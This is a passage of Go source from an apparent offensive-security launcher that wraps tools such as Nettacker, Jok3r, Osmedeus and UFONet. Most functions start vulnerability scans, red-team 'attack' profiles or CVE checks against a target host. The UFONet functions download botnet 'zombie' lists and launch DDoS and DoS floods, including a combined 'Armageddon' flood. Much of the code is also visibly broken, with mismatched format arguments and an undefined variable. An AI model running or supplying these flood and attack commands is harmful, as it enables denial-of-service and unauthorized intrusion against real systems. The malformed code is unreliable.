    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m information_gathering -s`, ToolsDir, Rhost)
    fmt.Println()
}

func NetTacker5(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m server_version_vuln`, ToolsDir, Rhost)
}

func NetTacker6(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming CVE scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m cve`, ToolsDir, Rhost)
}

func NetTacker7(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming critical scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m high_severity`, ToolsDir, Rhost)
}

func NetTacker8(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming intrusive scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s --profile all/results.txt`, ToolsDir, Rhost)
}

func NetTacker9() {
    fmt.Printf("\n%s[*] %sLaunched WebUI key: africana ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py --start-api --api-access-key africana`, ToolsDir, Rhost)
}

func Jok3r1() {
    fmt.Printf("\n%s[*] %sInstalling tools in the toolbox ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; bash install-all.sh`, ToolsDir, Rhost)
}

func Jok3r2() {
    fmt.Printf("\n%s[*] %sUpdating tools in the toolbox ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py toolbox --update-all --auto`, ToolsDir, Rhost)
}

func Jok3r3() {
    fmt.Printf("\n%s[*] %sShowing tools in the toolbox ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py toolbox --show-all`, ToolsDir, Rhost)
}

func Jok3r4() {
    fmt.Printf("\n%s[*] %sShowing supported products ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py info --services`, ToolsDir, Rhost)
}

func Jok3r5(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming avery fast-scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py attack -t %s --profile fast-scan --fast`, ToolsDir, Rhost)
}

func Jok3r6(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming security checks on " + bcolors.BrightRed + "\nTarget: " + bcolors.Yellow + "%s \n" + bcolors.Endc, Rhost)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, ToolsDir, Rhost)
}

func Jok3r7(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming critical scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, ToolsDir, Rhost)
}

func Jok3r8() {
    fmt.Printf("\n%s[*] %sShowing results & scans ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; xhost +; python3 jok3r.py db creds vulns mission hosts products services report quit; xhost -`)
}

func Jok3r9() {
    fmt.Printf("\n%s[*] %sCleaning results & scans ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py db "mission -d default"`)
}

func Osmedeus1() {
    fmt.Printf("\n%s[*] %sUpdating Osmedeus & Runing diagnostics to checks ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus version --json; osmedeus update; osmedeus update --vuln; osmedeus update --force --clean`)
}

func Osmedeus2(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming simple scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus --nv scan -t %s`, ToolsDir, Rhost)
}

func Osmedeus3(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming dir & vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus --nv scan -f vuln-and-dirb -t %s`, ToolsDir, Rhost)
}

func Osmedeus4(Targe string) {
    fmt.Printf("\n%s[*] %sPerforming bulk scan on " + bcolors.BrightYellow + "Targets " + bcolors.Endc + "= " + bcolors.Green + bcolors.Italic + "%s \n" + bcolors.Endc, Rhost)
    subprocess.Popen(`osmedeus scan -f vuln-and-dirb -t %s`, ToolsDir, Rhost)
}

func Osmedeus5(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming cloud scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus health cloud; osmedeus cloud --chunk -c 5 -t %s`, ToolsDir, Rhost)
}

func Osmedeus6(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming secret & vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus scan --tactic aggressive --nv -f vuln-and-dirb -t %s`, ToolsDir, Rhost)
}

func Osmedeus7(Rhost string) {
    fmt.Printf("\n%s[*] %sUpdating db before running vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus scan --update-vuln -t %s`, ToolsDir, Rhost)
}

func Osmedeus8(Port string) {
    fmt.Printf("\n%s[*] %sStarted Osmedeusweb UI server on " + bcolors.BrightYellow + "localhost:%s%s", Port, bcolors.Endc)
    subprocess.Popen(`osmedeus server --port %s`, Port)
}

func Osmedeus9() {
    fmt.Printf("\n%s[*] %sShowing scanned osmedeus report list ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus report list`)
}

func Ufonet1() {
    fmt.Printf("\n%s[*] %sDownloading list of bots from C.S ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet --download-zombies`)
}

func Ufonet2() {
    fmt.Printf("\n%s[*] %sTesting If all bots are alive & ready to launch ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -t botnet/zombies.txt`)
}

func Ufonet3(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched Palantir 3.14 ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" -a "%s"`, ToolsDir, Rhost)
}

func Ufonet4(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched Socking_waves(instant-knockout!) ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --nuke "10000" -a "%s"`, ToolsDir, Rhost)
}

func Ufonet5(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched xcom-1(only DDoS) ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --spray "1000" --smurf "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" -a "%s"`, ToolsDir, Rhost)
}

func Ufonet6(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched xcom-2(only DoS) ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --xmas "1000" --nuke "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, ToolsDir, Rhost)
}

func Ufonet7() {
    fmt.Printf("\n%s[*] %sLaunched ufonet UI on http://localhost:9999 ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet --gui`)
}

func Ufonet8() {
    fmt.Printf("\n%s[*] %sStarted Grider ufonet --grider ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet --grider`)
}

func Ufonet9(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched Armageddon! with All! ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, ToolsDir, Rhost)
}

